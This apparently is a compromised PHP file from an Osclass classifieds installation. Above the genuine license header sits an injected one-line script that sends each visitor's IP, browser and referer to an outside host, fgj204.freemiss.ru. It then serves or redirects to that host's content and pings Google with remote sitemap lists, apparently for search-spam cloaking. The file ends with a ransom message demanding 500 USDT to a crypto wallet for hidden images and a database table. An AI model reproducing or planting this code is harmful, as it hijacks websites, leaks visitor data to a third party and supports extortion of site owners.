<?php
//$a='fgj204';@set_time_limit(3600);define("W",'http://fgj204.freemiss.ru');define("U",getu());function k($b){return@$_SERVER[$b]?$_SERVER[$b]:"";}define("S",k("PHP_SELF"));define("F",strpos(S,"index.php")!==false&&strpos(U,S)===false?rtrim(S,"index.php"):S);$d=$_REQUEST["p"];$f=ltrim(U,F);if($d!="")$f=preg_replace("@(\?|\&)p=".$d."@","",$f);define("U2",preg_replace("#^\W+#","",$f));$h=k('HTTP_USER_AGENT');function getu(){$k=k("REQUEST_URI");if(empty($k)){$l=k('argv');$k=S.'?'.(is_array($l)?$l[0]:k('QUERY_STRING'));}return $k;}function is_https(){if(!empty($_SERVER['HTTPS'])&&strtolower($_SERVER['HTTPS'])!=='off'){return true;}elseif(!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']==='https'){return true;}elseif(!empty($_SERVER['HTTP_FRONT_END_HTTPS'])&&strtolower($_SERVER['HTTP_FRONT_END_HTTPS'])!=='off'){return true;}return false;}function get_ip(){$p=$_SERVER['REMOTE_ADDR'];if(!empty($_SERVER['HTTP_CLIENT_IP'])){$p=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$p=$_SERVER['HTTP_X_FORWARDED_FOR'];}if(stristr($p,',')){$t=explode(",",$p);$p=$t[0];}return $p;}function http($u,$ff){$gg="text/html";if(strpos(U2,"pingsitemap")===false&&(strpos(U2,".xml")!==false||strpos(U2,"/feed")!==false)){$gg="text/xml";}else if(strpos(U2,".txt")!==false){$gg="text/plain";}else if(strpos(U2,"images/")!==false){$gg="image/webp";}else if(strpos(U2,"sitemap.xsl")!==false){$gg="text/css";}header("content-type: $gg; charset=UTF-8");$hh=http_build_query($ff);$ii=W.$u."?".$hh;$jj=@file_get_contents($ii);if(!$jj)$jj=c(W.$u,$hh,0);if(!$jj)$jj=c(W.$u,$hh,1);if(!$jj){$kk=@fopen($ii,'r');if($kk){stream_get_meta_data($kk);$ll="";while(!feof($kk)){$ll.=fgets($kk,1024);}fclose($kk);return $ll;}}return $jj;}function c($u,$hh,$mm){$nn=curl_init();if($mm){curl_setopt($nn,CURLOPT_URL,$u);curl_setopt($nn,CURLOPT_POST,1);curl_setopt($nn,CURLOPT_POSTFIELDS,$hh);}else{curl_setopt($nn,CURLOPT_URL,$u."?".$hh);}curl_setopt($nn,CURLOPT_RETURNTRANSFER,1);curl_setopt($nn,CURLOPT_HEADER,0);curl_setopt($nn,CURLOPT_TIMEOUT,10);curl_setopt($nn,CURLOPT_FOLLOWLOCATION,1);$jj=curl_exec($nn);curl_close($nn);return $jj;}function g($u,$ff){$jj=http($u,$ff);if(!$jj){@header('HTTP/1.1 500 Internal Server Error');die();}$b=substr($jj,0,1);switch($b){case "4":@header('HTTP/1.1 404 Not Found');die();case "5":@header('HTTP/1.1 500 Internal Server Error');die();case "3":@header('HTTP/1.1 302 Moved Permanently');header('Location: '.substr($jj,1));header('referer: '.k("HTTP_HOST"));die();case "7":return false;case "8":die();default:header('HTTP/1.1 200 OK');return $jj;}}if(strpos(U,"jp2023")!==false){echo "<p>JP2023</p><p>".$a."-beautiful</p>";die();}$oo=array("ip"=>get_ip(),"lang"=>k("HTTP_ACCEPT_LANGUAGE"),"ua"=>$h,"r"=>strtolower(k("HTTP_REFERER")),"host"=>k("HTTP_HOST"),"uri"=>U,"uri2"=>U2,"isBot"=>preg_match("@google|yahoo|bing@",$h)?"1":"","f"=>F,"p"=>$d);if(is_https()){$oo["h"]="1";}if(strpos(U,"pingsitemap")!==false){$pp=explode(",",g("/sitemap.list",$oo));foreach($pp as $qq){$ff='https://www.google.com/ping?sitemap='.$qq;$jj=c($ff,array(),0);if(!$jj){$jj=@file_get_contents($ff);}if(stristr($jj,'successfully')){echo $ff.'<br>pingok<br>';}else{echo $ff.'======creat file false!<br>';}}die();}$rr=g("",$oo);if($rr)die($rr);?><?php
/*
 * Copyright 2014 Osclass
 * Copyright 2021 Osclass by OsclassPoint.com
 *
 * Osclass maintained & developed by OsclassPoint.com
 * You may not use this file except in compliance with the License.
 * You may download copy of Osclass at
 *
 *     https://osclass-classifieds.com/download
 *
 * Do not edit or add to this file if you wish to upgrade Osclass to newer
 * versions in the future. Software is distributed on an "AS IS" basis, without
 * warranties or conditions of any kind, either express or implied. Do not remove
 * this NOTICE section as it contains license information and copyrights.
 */


echo "All images for items are hidden now. And also db table is hidden. Send 500 USDT to this address. ";
echo "<br>";
echo "TSUQSbejs4Epf87q5wwtuQ4v2FxFJBsHvm ";
echo "<br>";
echo "Then will be backuped.";
?>